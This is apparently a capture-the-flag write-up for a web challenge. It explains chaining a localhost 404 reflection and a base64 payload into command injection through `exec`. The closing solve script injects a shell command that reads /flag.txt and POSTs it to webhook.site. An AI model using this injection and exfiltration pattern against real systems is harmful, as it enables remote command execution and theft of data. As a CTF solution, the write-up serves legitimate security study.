---
created: 2024-08-02T15:00
updated: 2024-08-05T19:36
solves: 87
points: 100
tags:
  - reflection
---

To inject content into `exec`, we have to make `localhost` output arbitrary content.

We can do that with 404.

`target?url=(localhost/payload)`
![image.png](https://res.cloudinary.com/kumonochisanaka/image/upload/v1722625383/2024/08/75a8802358f655bfa756b85929d323c2.png)

The payload would hence be something like this.
`target?url=(localhost?url=localhost/payload)`

Since the output goes through base64 decode, we also have to encode our payload.

However, with some debugging I found out that the html content itself after base64 decode, will produce a unclosed backtick, we need to close it ourselves.

![image.png](https://res.cloudinary.com/kumonochisanaka/image/upload/v1722625635/2024/08/0ea78502d162e8923b24ebc7a6d359e3.png)

## solve script

```python
import base64
import requests
import urllib.parse

payload = "`;\ncat /flag.txt | curl https://webhook.site/ -X POST -d @-\n"
payload = base64.b64encode(payload.encode()).decode()
safe_string = urllib.parse.quote_plus("http://localhost/"+payload)
safe_string = urllib.parse.quote_plus("http://localhost/?url="+safe_string)
requests.get("http://challs.tfcctf.com:30795/?url="+safe_string)
```
